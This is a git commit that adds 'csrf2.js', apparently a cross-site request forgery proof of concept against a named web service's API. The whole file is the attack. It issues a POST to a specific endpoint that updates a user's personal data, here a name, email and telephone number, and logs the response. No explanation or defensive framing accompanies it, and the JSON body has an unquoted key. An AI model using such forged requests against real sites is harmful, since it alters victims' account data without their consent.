3645b04f71ab6bc37a13dade3fad78e4882e80b6
David Deck <deck.david@gmail.com>
2020-11-05 10:56:13 +0100

    Create csrf2.js

---
+++ csrf2.js
@@ -0,0 +1,19 @@
+  var url = "https://vobygca.com/vobygca/api/utilisateur/personnalData";
+
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", url);
+
+  xhr.setRequestHeader("Accept", "application/json");
+  xhr.setRequestHeader("Content-Type", "application/json");
+
+  xhr.onreadystatechange = function () {
+     if (xhr.readyState === 4) {
+        console.log(xhr.status);
+        console.log(xhr.responseText);
+   }};
+
+  var data = `{
+    "nom": "LAPIERRE", "prenom": "Franck", "email": "Franck_lapierre@gcatrans.com", telephone: "123456789"
+  }`;
+
+  xhr.send(data);
